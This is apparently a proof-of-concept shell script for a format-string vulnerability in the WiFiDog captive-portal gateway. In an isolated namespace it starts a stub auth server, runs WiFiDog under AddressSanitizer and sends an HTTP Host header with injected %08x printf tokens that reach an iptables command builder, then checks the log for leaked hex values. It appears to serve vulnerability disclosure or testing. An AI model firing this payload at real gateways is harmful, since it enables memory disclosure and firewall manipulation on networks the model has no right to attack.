#!/usr/bin/env sh
set -eu

ROOT_DIR="$(CDPATH= cd -- "$(dirname "$0")/.." && pwd)"
WIFIDOG="$ROOT_DIR/src/wifidog"
CONF="$ROOT_DIR/poc/wifidog-loopback-domain.conf"
LOG="$ROOT_DIR/poc/poc-host-format-string.log"

command -v unshare >/dev/null 2>&1 || { echo "error: unshare not found" >&2; exit 1; }
command -v python3 >/dev/null 2>&1 || { echo "error: python3 not found" >&2; exit 1; }

rm -f "$LOG"

unshare -Urn sh -c "
set -eu
cd \"$ROOT_DIR\"
ip link set lo up
rm -f /tmp/wdctl-wifidog-poc.sock

python3 - <<'PY' &
from http.server import BaseHTTPRequestHandler, HTTPServer

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        body = b'Pong' if self.path.startswith('/ping/') else b'OK'
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, fmt, *args):
        pass

HTTPServer(('127.0.0.1', 8081), H).serve_forever()
PY
auth_pid=\$!

ASAN_OPTIONS=abort_on_error=1:symbolize=0:halt_on_error=1 \"$WIFIDOG\" -f -c \"$CONF\" -d 7 >\"$LOG\" 2>&1 &
pid=\$!

for i in 1 2 3 4 5 6 7 8 9 10; do
  python3 - <<'PY' && break || true
import socket, sys
try:
    s = socket.create_connection(('127.0.0.1', 2060), timeout=0.2)
    s.close()
    sys.exit(0)
except Exception:
    sys.exit(1)
PY
  sleep 0.2
done

# Wait for WiFiDog to consider the auth server reachable.
for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do
  python3 - <<'PY' && break || true
import socket
req = (
    'GET /wifidog/status HTTP/1.0\\r\\n'
    'Host: localhost\\r\\n'
    '\\r\\n'
)
s = socket.create_connection(('127.0.0.1', 2060), timeout=0.5)
s.sendall(req.encode())
resp = s.recv(8192)
s.close()
if b'Auth server reachable: yes' not in resp:
    raise SystemExit(1)
PY
  sleep 0.2
done

# Trigger the fw_allow_host() path with a Host header containing the gateway-id token plus extra printf-format tokens.
# This reaches iptables_insert_gateway_id(), which treats the entire command string as a printf format.
python3 - <<'PY'
import socket
host = 'fmt\$ID\$-%08x-%08x-%08x.example.com'
req = (
    'GET /does-not-exist HTTP/1.0\\r\\n'
    f'Host: {host}\\r\\n'
    '\\r\\n'
)
s = socket.create_connection(('127.0.0.1', 2060), timeout=1.0)
s.sendall(req.encode())
s.close()
PY

sleep 0.5
kill \"\$pid\" 2>/dev/null || true
kill \"\$auth_pid\" 2>/dev/null || true
wait \"\$pid\" || true
wait \"\$auth_pid\" || true
"

echo "Log: $LOG"
if command -v rg >/dev/null 2>&1; then
  # Look for evidence that the injected %08x tokens were expanded into hex values in the logged command.
  rg -n "fmtlo-[0-9a-fA-F]{8}-[0-9a-fA-F]{8}-[0-9a-fA-F]{8}\\.example\\.com" "$LOG" || true
fi
